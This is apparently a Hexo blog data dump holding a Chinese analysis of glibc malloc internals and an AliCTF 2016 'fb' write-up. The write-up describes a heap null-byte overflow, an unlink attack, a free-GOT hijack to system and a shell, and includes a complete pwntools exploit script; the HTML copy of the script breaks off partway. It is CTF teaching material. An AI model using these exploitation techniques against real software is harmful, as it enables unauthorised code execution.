设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>\n<h4 id=\"关于sysmalloc\"><a href=\"#关于sysmalloc\" class=\"headerlink\" title=\"关于sysmalloc\"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>\n<h4 id=\"按fast-bin、small-bin、large-bin分\"><a href=\"#按fast-bin、small-bin、large-bin分\" class=\"headerlink\" title=\"按fast bin、small bin、large bin分\"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>\n<h4 id=\"关于巨块的分配\"><a href=\"#关于巨块的分配\" class=\"headerlink\" title=\"关于巨块的分配\"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>\n<h2 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>\n<h4 id=\"来自源码中的注释\"><a href=\"#来自源码中的注释\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>\n<h4 id=\"关于获取Size\"><a href=\"#关于获取Size\" class=\"headerlink\" title=\"关于获取Size\"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>\n<h2 id=\"关于堆的收缩\"><a href=\"#关于堆的收缩\" class=\"headerlink\" title=\"关于堆的收缩\"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>\n<h4 id=\"来自源码中的注释-1\"><a href=\"#来自源码中的注释-1\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>\n<p>最后附一张图：<br><img src=\"/images/linux_heap_analysis0.png\" alt=\"linux_heap_analysis0.png\"></p>\n","excerpt":"<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>","more":"<h2 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>\n<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>\n<h4 id=\"关于sysmalloc\"><a href=\"#关于sysmalloc\" class=\"headerlink\" title=\"关于sysmalloc\"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>\n<h4 id=\"按fast-bin、small-bin、large-bin分\"><a href=\"#按fast-bin、small-bin、large-bin分\" class=\"headerlink\" title=\"按fast bin、small bin、large bin分\"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>\n<h4 id=\"关于巨块的分配\"><a href=\"#关于巨块的分配\" class=\"headerlink\" title=\"关于巨块的分配\"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>\n<h2 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>\n<h4 id=\"来自源码中的注释\"><a href=\"#来自源码中的注释\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>\n<h4 id=\"关于获取Size\"><a href=\"#关于获取Size\" class=\"headerlink\" title=\"关于获取Size\"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>\n<h2 id=\"关于堆的收缩\"><a href=\"#关于堆的收缩\" class=\"headerlink\" title=\"关于堆的收缩\"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>\n<h4 id=\"来自源码中的注释-1\"><a href=\"#来自源码中的注释-1\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>\n<p>最后附一张图：<br><img src=\"/images/linux_heap_analysis0.png\" alt=\"linux_heap_analysis0.png\"></p>"},{"title":"AliCTF 2016 fb writeup","date":"2016-06-07T12:33:00.000Z","_content":"\n一道堆中的null byte溢出题\n\n程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存\n\n<!--more-->\n\n由于读取输入的时候会在最后再添加'\\x00'：\n```\n.text:00000000004008E4                 cdqe\n.text:00000000004008E6                 lea     rdx, [rax-1]\n.text:00000000004008EA                 mov     rax, [rbp+var_18]\n.text:00000000004008EE                 add     rax, rdx\n.text:00000000004008F1                 mov     byte ptr [rax], 0\n.text:00000000004008F4                 mov     eax, [rbp+var_8]\n.text:00000000004008F7                 sub     eax, 1\n```\n\n所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来...）\n\n之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：\n\n```\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n```\n所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用[libc-database][1]这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址\n\n然后泄漏出来算下偏移就可以调用system()了\n\n\n\nExploit:\n\n```python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nio=process('./fb')\n# io = remote(\"114.55.103.213\",9733)\n\nSIZE=0xf8\nPLT_puts=0x4006C0\nGOT_free=0x602018\nGOT_read=0x602040\nFD=0x6020C8\nBK=0x6020D0\n\ndef init(size):\n\tio.recvuntil('Choice:')\n\tio.sendline('1')\n\tio.recvuntil('length:')\n\tio.sendline(str(size))\n\tio.recvuntil('Done~')\n\ndef edit(index,content):\n\tio.recvuntil('Choice:')\n\tio.sendline('2')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('content:')\n\tio.sendline(str(content))\n\tio.recvuntil('Done~')\n\ndef delete(index):\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('Done~')\n\ndef leak(dst):\n\tedit(1,p64(dst)+p64(SIZE)[:-1])\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('0')\n\tleakmem = io.recvuntil(\"Done~\")[:-6]\n\treturn str(leakmem)\n\ndef main():\n\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\n\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)\n\t# overflow null byte\n\tedit(2,payload)\n        # gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))\n\tdelete(3)\n        \n\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)\n\tedit(2,payload2)\n\n\t# modify GOT entry of free to PLT entry of puts\n\t# use [:1] to prevent \\x00 from causing damage\n\tedit(2,p64(PLT_puts)[:-1])\n\n\t# leak read_addr\n\tread_addr=u64(leak(GOT_read).ljust(8,'\\x00'))\n\tprint \"read_addr: \"+str(hex(read_addr))\n\n\n\tsystem_addr=read_addr-0x980C0\n\t# system_addr= read_addr-0xeb6a0 +0x46590\n\t\n\t# modify free to system\n\tedit(2,p64(system_addr)[:-1])\n\tedit(4,\"/bin/sh\")\n\t\n\t# now get shell\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('4')\n\n\tio.interactive()\n\nmain()\n\n\n```\n\n\n[1]: https://github.com/niklasb/libc-database\n","source":"_posts/alictf_2016_fb_writeup.md","raw":"title: AliCTF 2016 fb writeup\n\ndate: 2016/06/07 20:33:00\n\n---\n\n一道堆中的null byte溢出题\n\n程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存\n\n<!--more-->\n\n由于读取输入的时候会在最后再添加'\\x00'：\n```\n.text:00000000004008E4                 cdqe\n.text:00000000004008E6                 lea     rdx, [rax-1]\n.text:00000000004008EA                 mov     rax, [rbp+var_18]\n.text:00000000004008EE                 add     rax, rdx\n.text:00000000004008F1                 mov     byte ptr [rax], 0\n.text:00000000004008F4                 mov     eax, [rbp+var_8]\n.text:00000000004008F7                 sub     eax, 1\n```\n\n所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来...）\n\n之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：\n\n```\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n```\n所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用[libc-database][1]这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址\n\n然后泄漏出来算下偏移就可以调用system()了\n\n\n\nExploit:\n\n```python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nio=process('./fb')\n# io = remote(\"114.55.103.213\",9733)\n\nSIZE=0xf8\nPLT_puts=0x4006C0\nGOT_free=0x602018\nGOT_read=0x602040\nFD=0x6020C8\nBK=0x6020D0\n\ndef init(size):\n\tio.recvuntil('Choice:')\n\tio.sendline('1')\n\tio.recvuntil('length:')\n\tio.sendline(str(size))\n\tio.recvuntil('Done~')\n\ndef edit(index,content):\n\tio.recvuntil('Choice:')\n\tio.sendline('2')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('content:')\n\tio.sendline(str(content))\n\tio.recvuntil('Done~')\n\ndef delete(index):\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('Done~')\n\ndef leak(dst):\n\tedit(1,p64(dst)+p64(SIZE)[:-1])\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('0')\n\tleakmem = io.recvuntil(\"Done~\")[:-6]\n\treturn str(leakmem)\n\ndef main():\n\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\n\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)\n\t# overflow null byte\n\tedit(2,payload)\n        # gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))\n\tdelete(3)\n        \n\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)\n\tedit(2,payload2)\n\n\t# modify GOT entry of free to PLT entry of puts\n\t# use [:1] to prevent \\x00 from causing damage\n\tedit(2,p64(PLT_puts)[:-1])\n\n\t# leak read_addr\n\tread_addr=u64(leak(GOT_read).ljust(8,'\\x00'))\n\tprint \"read_addr: \"+str(hex(read_addr))\n\n\n\tsystem_addr=read_addr-0x980C0\n\t# system_addr= read_addr-0xeb6a0 +0x46590\n\t\n\t# modify free to system\n\tedit(2,p64(system_addr)[:-1])\n\tedit(4,\"/bin/sh\")\n\t\n\t# now get shell\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('4')\n\n\tio.interactive()\n\nmain()\n\n\n```\n\n\n[1]: https://github.com/niklasb/libc-database\n","slug":"alictf_2016_fb_writeup","published":1,"updated":"2016-11-01T13:30:05.356Z","_id":"ciuzgpo6y0000y060u1e5leid","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一道堆中的null byte溢出题</p>\n<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>\n<a id=\"more\"></a>\n<p>由于读取输入的时候会在最后再添加’\\x00’：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">.text:00000000004008E4                 cdqe</div><div class=\"line\">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class=\"line\">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class=\"line\">.text:00000000004008EE                 add     rax, rdx</div><div class=\"line\">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class=\"line\">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class=\"line\">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>\n<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>\n<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">CANARY    : ENABLED</div><div class=\"line\">FORTIFY   : disabled</div><div class=\"line\">NX        : ENABLED</div><div class=\"line\">PIE       : disabled</div><div class=\"line\">RELRO     : Partial</div></pre></td></tr></table></figure>\n<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href=\"https://github.com/niklasb/libc-database\" target=\"_blank\" rel=\"external\">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>\n<p>然后泄漏出来算下偏移就可以调用system()了</p>\n<p>Exploit:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">io=process(<span class=\"string\">'./fb'</span>)</div><div class=\"line\"><span class=\"comment\"># io = remote(\"114.55.103.213\",9733)</span></div><div class=\"line\"></div><div class=\"line\">SIZE=<span class=\"number\">0xf8</span></div><div class=\"line\">PLT_puts=<span class=\"number\">0x4006C0</span></div><div class=\"line\">GOT_free=<span class=\"number\">0x602018</span></div><div class=\"line\">GOT_read=<span class=\"number\">0x602040</span></div><div class=\"line\">FD=<span class=\"number\">0x6020C8</span></div><div class=\"line\">BK=<span class=\"number\">0x6020D0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init</span><span class=\"params\">(size)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'length:'</span>)</div><div class=\"line\">\tio.sendline(str(size))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,content)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'content:'</span>)</div><div class=\"line\">\tio.sendline(str(content))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span><span class=\"params\">(dst)</span>:</span></div><div class=\"line\">\tedit(<span class=\"number\">1</span>,p64(dst)+p64(SIZE)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'0'</span>)</div><div class=\"line\">\tleakmem = io.recvuntil(<span class=\"string\">\"Done~\"</span>)[:<span class=\"number\">-6</span>]</div><div class=\"line\">\t<span class=\"keyword\">return</span> str(leakmem)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"></div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\"></div><div class=\"line\">\tpayload=p64(<span class=\"number\">0xf1</span>)+p64(<span class=\"number\">0xf1</span>)+p64(FD)+p64(BK)+<span class=\"string\">'A'</span>*<span class=\"number\">0xd0</span>+p64(<span class=\"number\">0xf0</span>)</div><div class=\"line\">\t<span class=\"comment\"># overflow null byte</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload)</div><div class=\"line\">        <span class=\"comment\"># gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))</span></div><div class=\"line\">\tdelete(<span class=\"number\">3</span>)</div><div class=\"line\">        </div><div class=\"line\">\tpayload2=p64(SIZE)+p64(<span class=\"number\">0x6020C0</span>)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload2)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># modify GOT entry of free to PLT entry of puts</span></div><div class=\"line\">\t<span class=\"comment\"># use [:1] to prevent \\x00 from causing damage</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(PLT_puts)[:<span class=\"number\">-1</span>])</div><div class=\"line\"></div><div class=\"line\">\t<span 